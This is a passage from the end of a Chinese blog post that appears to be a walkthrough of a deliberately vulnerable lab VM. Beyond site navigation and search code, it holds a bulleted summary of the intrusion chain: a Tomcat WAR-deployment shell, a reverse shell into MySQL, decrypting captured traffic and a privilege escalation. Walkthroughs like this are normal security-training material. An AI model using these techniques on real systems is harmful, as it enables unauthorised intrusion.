+<p>为什么不能通过ssh发送到本地</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1cb38b9fe1.jpg" alt=""></p>
+<p>那将其拷贝到其他文件夹再发出来好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp flair.jpg /home/blumbergh/1.jpg</span><br></pre></td></tr></table></figure>
+<p>再发送到本地</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1cbdc8cafe.jpg" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><ul>
+<li>web端口先拿到cms的管理员账号</li>
+<li>cms邮箱拿到ssl密钥</li>
+<li><code>View Account</code>标签那里拿到一个数据包以及一个tomcat:tomcat账号</li>
+<li>利用上面拿到的ssl密钥解密数据包拿到网站后台以及账号密码</li>
+<li>部署war包getshell</li>
+<li>后台拿到mysql配置信息</li>
+<li>反弹shell登录mysql</li>
+<li>拿到milton账号密码</li>
+<li>web目录图片隐写拿到blubergh用户密码</li>
+<li>利用bee命令写入sh任务脚本提权</li>
+</ul>
+<h4 id="学到的新东西"><a href="#学到的新东西" class="headerlink" title="学到的新东西"></a>学到的新东西</h4><ul>
+<li>利用密钥找到私钥来解密数据包</li>
+<li>tomcat部署war包getshell</li>
+<li>利用bee命令写入文件</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机渗透/" rel="tag"><i class="fa fa-tag"></i> 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/31/靶机渗透-acid/" rel="next" title="靶机渗透_acid">
+                <i class="fa fa-chevron-left"></i> 靶机渗透_acid
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/31/软连接/" rel="prev" title="软连接">
+                软连接 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP："><span class="nav-number">1.1.</span> <span class="nav-text">IP：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口："><span class="nav-number">1.2.</span> <span class="nav-text">端口：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器："><span class="nav-number">1.3.</span> <span class="nav-text">服务器：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web信息收集"><span class="nav-number">1.4.</span> <span class="nav-text">web信息收集</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#整体思路"><span class="nav-number">4.1.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#学到的新东西"><span class="nav-number">4.2.</span> <span class="nav-text">学到的新东西</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
